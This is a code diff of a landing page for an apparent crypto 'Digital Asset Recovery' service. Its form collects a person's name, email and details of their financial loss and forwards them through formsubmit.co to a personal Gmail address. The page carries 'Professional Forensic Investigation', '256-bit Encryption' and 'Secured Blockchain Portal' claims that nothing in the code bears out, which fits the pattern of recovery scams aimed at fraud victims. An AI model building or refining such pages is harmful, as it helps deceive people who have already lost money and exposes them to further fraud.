@@ -3,12 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Digital Asset Recovery | Expert Blockchain Forensics</title>
+    <title>Digital Asset Recovery</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050508; color: white; font-family: 'Inter', sans-serif; }
         .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        #success-message { display: none; }
     </style>
 </head>
 <body class="p-6 md:p-12">
@@ -17,29 +16,24 @@
         <h1 class="text-4xl md:text-6xl font-bold mb-4 bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent">
             Digital Asset Recovery
         </h1>
-        <p class="text-gray-400 text-lg mb-12">Professional Forensic Investigation & Blockchain Fund Recovery</p>
+        <p class="text-gray-400 mb-12">Professional Forensic Investigation & Blockchain Fund Recovery</p>
 
         <div id="form-container" class="glass-card p-8 rounded-2xl text-left shadow-2xl">
-            <h2 class="text-2xl font-semibold mb-2">Initial Case Assessment</h2>
-            <p class="text-gray-400 mb-6 text-sm">A specialist will review your case within 24 hours.</p>
+            <h2 class="text-2xl font-semibold mb-6">Initial Case Assessment</h2>
             
-            <form action="https://formsubmit.co/recoveryspecialistdigitalasset@gmail.com" method="POST">
-                <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_subject" value="NEW CASE: Recovery Request">
-                <input type="hidden" name="_template" value="table">
-
+            <form id="recovery-form" action="https://formsubmit.co/ajax/recoveryspecialistdigitalasset@gmail.com" method="POST">
                 <div class="space-y-4">
                     <input type="text" name="name" placeholder="Full Name" required 
-                           class="w-full bg-black/50 border border-white/10 p-4 rounded-lg focus:outline-none focus:border-cyan-500 transition text-white">
+                           class="w-full bg-black/50 border border-white/10 p-4 rounded-lg focus:outline-none focus:border-cyan-500 text-white">
                     
                     <input type="email" name="email" placeholder="Contact Email" required 
-                           class="w-full bg-black/50 border border-white/10 p-4 rounded-lg focus:outline-none focus:border-cyan-500 transition text-white">
+                           class="w-full bg-black/50 border border-white/10 p-4 rounded-lg focus:outline-none focus:border-cyan-500 text-white">
                     
-                    <textarea name="case_details" placeholder="Describe the loss (Platform, Amount, Date...)" required 
-                              class="w-full bg-black/50 border border-white/10 p-4 rounded-lg h-32 focus:outline-none focus:border-cyan-500 transition text-white"></textarea>
+                    <textarea name="case_details" placeholder="Describe the incident..." required 
+                              class="w-full bg-black/50 border border-white/10 p-4 rounded-lg h-32 focus:outline-none focus:border-cyan-500 text-white"></textarea>
                     
-                    <button type="submit" 
-                            class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold py-4 rounded-lg hover:opacity-90 transition shadow-lg shadow-cyan-500/20 uppercase tracking-widest">
+                    <button type="submit" id="submit-btn"
+                            class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 text-white font-bold py-4 rounded-lg hover:opacity-90 transition shadow-lg uppercase tracking-widest">
                         Submit Case for Review
                     </button>
                 </div>
@@ -49,23 +43,42 @@
         <div id="success-box" class="hidden glass-card p-12 rounded-2xl border-cyan-500/50">
             <div class="text-cyan-500 text-6xl mb-4">✓</div>
             <h2 class="text-3xl font-bold mb-2">Submission Received</h2>
-            <p class="text-gray-400">Your case has been logged. Check your email for a response from our forensics team shortly.</p>
+            <p class="text-gray-400">Your case has been logged. Our forensics team will contact you via email shortly.</p>
             <button onclick="window.location.reload()" class="mt-8 text-cyan-500 underline text-sm">Submit another case</button>
         </div>
 
-        <div class="mt-8 flex items-center justify-center gap-4 text-gray-500 text-xs">
-            <span>● 256-bit Encryption</span>
-            <span>● Secured Blockchain Portal</span>
+        <div class="mt-8 text-gray-500 text-xs italic">
+            ● 256-bit Encryption ● Secured Blockchain Portal
         </div>
     </div>
 
     <script>
-        const form = document.querySelector('form');
-        form.onsubmit = function() {
-            document.getElementById('form-container').classList.add('hidden');
-            document.getElementById('success-box').classList.remove('hidden');
+        const form = document.getElementById('recovery-form');
+        const formContainer = document.getElementById('form-container');
+        const successBox = document.getElementById('success-box');
+        const btn = document.getElementById('submit-btn');
+
+        form.onsubmit = async (e) => {
+            e.preventDefault();
+            btn.innerText = "SENDING...";
+            btn.disabled = true;
+
+            const formData = new FormData(form);
+            const response = await fetch(form.action, {
+                method: "POST",
+                body: formData,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            if (response.ok) {
+                formContainer.classList.add('hidden');
+                successBox.classList.remove('hidden');
+            } else {
+                alert("Error. Please try again.");
+                btn.innerText = "Submit Case for Review";
+                btn.disabled = false;
+            }
         };
     </script>
-
 </body>
 </html>
